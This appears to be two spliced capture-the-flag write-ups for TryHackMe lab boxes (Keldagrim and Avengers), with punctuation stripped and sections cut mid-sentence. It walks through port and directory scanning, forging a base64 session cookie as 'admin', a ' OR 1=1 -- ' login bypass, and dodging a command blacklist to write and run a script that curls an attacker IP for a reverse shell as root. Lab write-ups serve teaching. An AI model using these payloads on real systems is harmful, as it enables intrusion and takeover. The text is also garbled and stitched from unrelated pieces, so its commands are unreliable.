boxEnumerating the ports  we find that only ports 22 and 80 are open reports Keldagrim image2 png Looking at the results we don t find anything out of the ordinary  except for the httponly flag not being set  Let s just check out the website and see what we find reports Keldagrim image12 png xt file  We are met with a very simple page with a couple of directories  On the  Our Team  tab we find two possible users  Jed and Jad  This may or may not be useful later on  so I made sure to add this to my notes txt file  Looking around we click on the  Buy Gold  tab and we see an interesting Admin option reports Keldagrim image1 png Unfortunately the admin option is grayed out  I couldn t find anything more useful in this so let s use our trusty tool  Burpsuite  I captured a request to the  team directory and saw a couple of very strange things reports Keldagrim image10 png First of all  there is a session cookie which is encoded in base64  Decoding this  we see that Z3Vlc3Q  is the base64 encode of guest  When base64 encoding the string  admin   YWRtaW4   and pasting that into the session cookie  we see that the content length changes  Let s use the developer tools  paste this base64 string in the session value  and reload the page reports Keldagrim image5 png And we are now the admin  Unfortunately  there is not much that has changed except for the strange  sales  cookie which is also base64 encoded  Decoding this  we see that it corresponds to the  2 165 we see on the screen  At this point  I was stuck for a long time  but at the back of my mind was this strange server in one of my requests to the page with all the packages to be bought reports Keldagrim image13 png Server  Werkzeug 1 0 1 Python 3 6 9This is what comes to mind  Seeing Werkzeug and python brings to mind that maybe Flask has something to do with this  After a lot of research  it seemed that this box might be vulnerable to SSTI  Server Side Template Injection   I came across a great

room from TryHackMe that taught basic SQLi injection  It was structured in a CTF format in which the student would achieve each flag from solving a task  more on this later   Although this box was structured in a way to guide the student  I like to try to complete the box without the hints provided by the questions  and rather than taking you through how to complete each task in sequential order as the author intended  I will explain how I went through this box  As a result  I went the extra mile when completing this box without realizing it  After completing this box  I read many write ups but not one mentioned the secret flag  and more interestingly  no write ups rooted the box  I only found out later that the author of this box did not intend for the student to root the box   perhaps the author did not realize how the RCE vulnerability could be exploited     We will explore this more in detail further in this writeupAs usual we will enumerate the machine with nmap  sC  sV  oA nmap nmap  victim ip   This may take a while so I have already ran it   ok I m not ippsec  Anyways  looking at the results we see the following reports Avengers image14 png Right off the bat we know this machine is running Ubuntu  All the services are up to date  during the time of writing which is Jan 2021Let s take a look at the http serverLooking at the root page  we see a lot of comments by many avengers  but one in particular stands out reports Avengers image13 png Now this is an interesting comment that should be kept in mind  Before I started playing around with this website  I enumerated the directories of this http server with gobuster  always have some kind of enum going on in the backgroundgobuster dir  u http    victim ip   w  wordlist   o  output  fileI highly recommend checking out https   github com danielmiessler SecLists   as there are a lot of useful wordlists that you can use to bruteforce directories  passwords  and usernames  For this box I used the

thinking of commands similar to cat such as head and tail  but neither worked  Eventually  I tried less which successfully revealed the contents of the fifth flagNow at this point  I didn t know that I wasn t supposed to go any further so I kept thinking of ways on how I would get a reverse shell  I tried many commands such as curl  bash  nc  perl  python  and many more commands  I was thinking about how it was possible to get a reverse shell without specifically typing any of these blacklisted strings  I came to the conclusion that if I could echo a string to a text file  and then somehow prepend text to it  then I could create a file that would contain a malicious command  Here is the methodologyecho  url  attacker ip  rev  o  tmp reverse  shell     tmp malicious  commandsed  i  1s

commandschmod  x  tmp rev   tmp revAnd we get a reverse shell reports Avengers image3 png No need to privesc  We are already root because the server was running as root  Now this is a huge vulnerability that is not too uncommon  NEVER RUN YOUR WEB SERVERS AS ROOT  It is better to run a web server as a low privileged user such as www data in case of any web vulnerabilities  So anyways  now that we have root I d call the box done  Let s just get the flags straight from the terminalfind   2  dev null grep  i flag grep  i  txt reports Avengers image11 png grep  r flag2  home reports Avengers image12 png For task 6 view the html source code and scroll to the bottom  On the very left side of the screen is the number of lines of code reports Avengers image6 png So these are all the flags that the author wanted us to find when he published the room  but let s find the secret flag  something I stumbled on accidentally   I was curious on looking at the source code of the Jarvis command line to see which strings in particular are blacklisted  We strike a goldmine in  home ubuntu avengers server js reports Avengers image5 png Now that explains why a lot of the commands we wanted did not work  Let s see what else this file has to offer reports Avengers image10 png We get credentials to the mysql server of this box  Now that saves a lot of time trying to reset the credentials  Let s check it out reports Avengers image8 png  reports Avengers image7 png And we get the secret flagflag4 sanitize  queries  mr  starkLooking at the SQL source code of the site  also located in  home ubuntu avengers server js  we see why the website was vulnerable to the SQLi reports Avengers image18 png The following line is particularly interestingMade deliberately vulnerable   Changed from con query  SELECT    FROM users WHERE   username     AND password         username  password            con query  SELECT    FROM users WHERE username       username     AND password       password  function error  results  fields   When we wrote   OR 1 1       the line looked like thiscon query  SELECT    FROM users WHERE username     OR 1 1       username     AND password       password  function error  results  fieldsNote how the rest of the query is commented out using the dashes       Essentially  the server was looking for a person whose username is blank  or true  Now nobody in the http server had a blank name so that would run false  However the OR statement is key  A false statement  ORed  with a true statement makes the statement true as a whole  For this reason  the login query ran true giving us accessOverall  this was a very fun box with an interesting and unique way of rooting  although I don t think it was intended   This is my first writeup  and I hope you enjoyed reading it",
